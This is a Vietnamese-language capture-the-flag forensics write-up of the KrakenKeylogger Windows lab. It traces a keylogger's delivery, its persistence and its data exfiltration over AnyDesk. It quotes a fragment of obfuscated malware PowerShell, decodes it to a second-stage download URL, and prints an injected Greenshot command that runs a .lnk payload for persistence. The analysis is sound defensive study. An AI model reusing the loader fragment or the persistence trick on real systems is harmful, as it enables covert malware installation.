---
title: "KrakenKeylogger - Windows Persistence & Data Exfiltration Analysis"
date: 2025-07-04 12:00:00 +0700
categories: [CTF, Forensics]
tags: [windows, keylogger, persistence, lolapps, lolbins, timeline-analysis, srum]
image:
  path: /assets/img/posts/KrakenKeylogger/banner.png
  alt: KrakenKeylogger Lab
---

## Giới thiệu

**Difficulty**: Medium  
**Category**: Endpoint  
**Tools**: TimelineExplorer, plaso, sqlitebrowser

Bài lab phân tích hệ thống Windows bị compromised với keylogger và data exfiltration.

## Q1: What is the the web messaging app the employee used to talk to the attacker?

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/119-KrakenKeyLogger/temp_extract_dir/challenge]
└─$ find ./ -type f -name "*.db"
```

tìm kiếm file chứa db

```bash
./Users/OMEN/AppData/Local/Microsoft/Windows/Notifications/wpndatabase.db
```

ta thấy có file này liên quan đến notifications

Windows lưu tất cả **Windows Push Notifications** ở file `wpndatabase.db`

Nó ghi lại thông báo từ các ứng dụng UWP hoặc web app (bao gồm cả các ứng dụng chat trên web).

### Các loại Windows Push Notifications (WPN)

Trong Windows Push Notifications (WPN), có ba loại thông báo chính:

1. **Badge**
    - Là **biểu tượng nhỏ** trên icon của ứng dụng (ví dụ: số tin nhắn chưa đọc trên icon của Mail hoặc Teams).
    - Không bật pop-up, chỉ là trạng thái hiển thị số lượng.
2. **Tile**
    - Là **ô vuông (Live Tile)** trên Start Menu.
    - Có thể hiển thị thông tin động: ví dụ, dự báo thời tiết hoặc tin tức mới nhất.
3. **Toast**
    - Là **thông báo bật lên** ở góc màn hình (thường ở góc phải dưới).
    - Thường có âm thanh đi kèm và biến mất sau vài giây.
    - Đây là loại chứa **nội dung hữu ích nhất cho forensics**: thông tin người gửi, tin nhắn, email, thông báo từ mạng xã hội.

Trong điều tra forensics, **toast notifications** được ưu tiên vì thường ghi lại **chi tiết nội dung giao tiếp**.

![image.png](/assets/img/posts/KrakenKeylogger/image.png)

phát hiện db wpn

![image.png](/assets/img/posts/KrakenKeylogger/image%201.png)

### Cách 2: Sử dụng plaso và TimelineExplorer

Sử dụng tool này để tạo timeline

[https://plaso.readthedocs.io/en/latest/](https://plaso.readthedocs.io/en/latest/)

```bash
PS D:\Tools\plaso-20191203-py3.7-amd64> .\psteal.exe --source E:\CTF\forensics\119-KrakenKeyLogger\temp_extract_dir\challenge -o dynamic -w E:\CTF\forensics\119-KrakenKeyLogger\temp_extract_dir\challenge\output.csv
```

Sau đó dùng `TimelineExplorer` để xem

![image.png](/assets/img/posts/KrakenKeylogger/image%202.png)

Phát hiện AnyDesk

![image.png](/assets/img/posts/KrakenKeylogger/image%203.png)

![image.png](/assets/img/posts/KrakenKeylogger/image%204.png)

## Q2: What is the password for the protected ZIP file sent by the attacker to the employee?

![image.png](/assets/img/posts/KrakenKeylogger/image%205.png)

Xem kĩ file này

![image.png](/assets/img/posts/KrakenKeylogger/image%206.png)

sử dụng LECmd

```bash
$NpzibtULgyi = sDjLksFILdkrdR 'aht1.sen/hi/coucys.erstmaofershma//s:tpht';
$cDkdhkGBtl = $env:APPDATA + '\' + ($NpzibtULgyi -split '/')[-1];
```

có vẻ như là 1 URL

hỏi gpt thì ra giải 

```bash
>>> s = s[::-1]
>>> res = ""
>>> for i in range(len(s)//2):
...     res += s[i * 2 + 1] + s[i * 2]
...
>>> res
'https://masherofmasters.cyou/chin/se1.ht'
```

## Q3: What domain did the attacker use to download the second stage of the malware?

Từ Q2 → **Answer**: masherofmasters.cyou

## Q4: What is the name of the command that the attacker injected using one of the installed LOLAPPS on the machine to achieve persistence?

### LOLAPPS và LOLBins là gì?

**LOLAPPS** (Living Off the Land Applications) là các ứng dụng hợp pháp có sẵn trong Windows (ví dụ: PowerShell, MS Paint, Greenshot...) nhưng bị kẻ tấn công lợi dụng để thực hiện hoạt động xấu mà không cần cài malware mới → khó bị phát hiện.

**LOLBins** (Living Off the Land Binaries) là các **tệp thực thi hợp pháp có sẵn trên Windows** (ví dụ: `powershell.exe`, `certutil.exe`, `mshta.exe`, `regsvr32.exe`...), được kẻ tấn công lợi dụng để thực hiện hoạt động xấu mà không cần cài phần mềm mới.

- **Khác với LOLAPPS:**
    - **LOLBins**: tập trung vào **các binary gốc của hệ điều hành** (system binaries).
    - **LOLAPPS**: mở rộng hơn, bao gồm **ứng dụng hợp pháp của bên thứ ba** được cài thêm, cũng có thể bị lạm dụng.
- **Lý do bị lợi dụng:**
    - Luôn có mặt trên Windows.
    - Được hệ thống tin cậy, ít bị antivirus chặn.
    - Có nhiều chức năng mạnh (tải file, thực thi script, chỉnh sửa registry).
- **Ví dụ persistence với LOLBins:**
    - Dùng `regsvr32.exe` để chạy script độc hại từ xa.
    - Dùng `schtasks.exe` tạo scheduled task để mã độc tự chạy khi khởi động.

![image.png](/assets/img/posts/KrakenKeylogger/image%207.png)

![image.png](/assets/img/posts/KrakenKeylogger/image%208.png)

Tìm kiếm Greenshot. Ta xem file Greenshot.ini

- **`Commands=`**: là danh sách các "external commands" (lệnh bên ngoài) mà Greenshot có thể chạy trực tiếp từ giao diện của nó.
- Mặc định Greenshot hay có `MS Paint` để mở ảnh đã chụp trong Microsoft Paint.
- **`jlhgfjhdflghjhuhuh`**: đây là một lệnh được thêm vào thủ công – không phải mặc định.
    - Nhiều khả năng attacker đã lợi dụng tính năng *External Commands* của Greenshot để thêm một command độc hại.
    - Khi Greenshot khởi chạy hoặc khi user thao tác với ảnh, command này có thể chạy để tải mã độc hoặc giữ quyền truy cập (*persistence*).

**Answer**: jlhgfjhdflghjhuhuh

## Q5: What is the complete path of the malicious file that the attacker used to achieve persistence?

```bash
Argument.MS Paint="{0}"
Argument.jlhgfjhdflghjhuhuh=/c "C:\Users\OMEN\AppData\Local\Temp\templet.lnk"
; Should the command be started in the background.
RunInbackground.MS Paint=True
```

Attacker đã lợi dụng Greenshot bằng cách thêm một "external command" tên `jlhgfjhdflghjhuhuh`, khi chạy sẽ gọi `cmd.exe /c "C:\Users\OMEN\AppData\Local\Temp\templet.lnk"`, kích hoạt payload tải mã độc. Đây là cách **persistence** – attacker lợi dụng Greenshot (một LOLAPP) để duy trì khả năng thực thi mã độc trên máy nạn nhân.

**Answer**: C:\Users\OMEN\AppData\Local\Temp\templet.lnk

## Q6: What is the name of the application the attacker utilized for data exfiltration?

### Cách 1: sử dụng tool Srum + TimelineExplorer

```bash
PS D:\Tools\EricZimmerman> .\SrumECmd.exe -d E:\CTF\forensics\119-KrakenKeyLogger\temp_extract_dir\challenge --csv E:\CTF\forensics\119-KrakenKeyLogger\temp_extract_dir\challenge\
```

![image.png](/assets/img/posts/KrakenKeylogger/image%209.png)

nhận thấy anydesk.exe send và receive nhiều bytes bất thường

### Cách 2: tìm kiếm Mitre Att&ck tìm remote Access network

![image.png](/assets/img/posts/KrakenKeylogger/image%2010.png)

tìm kiếm anydesk

```bash
┌──(nqghuy㉿DESKTOP-AJTP5JK)-[~/forensics/119-KrakenKeyLogger/temp_extract_dir/challenge]
└─$ find ./ -iname "anydesk"
./Users/OMEN/AppData/Roaming/AnyDesk
./Users/OMEN/Videos/AnyDesk
```

**Answer**: AnyDesk

## Q7: What is the IP address of the attacker?

![image.png](/assets/img/posts/KrakenKeylogger/image%2011.png)

External Address: …

![image.png](/assets/img/posts/KrakenKeylogger/image%2012.png)

Hoặc sử dụng TimelineExplorer
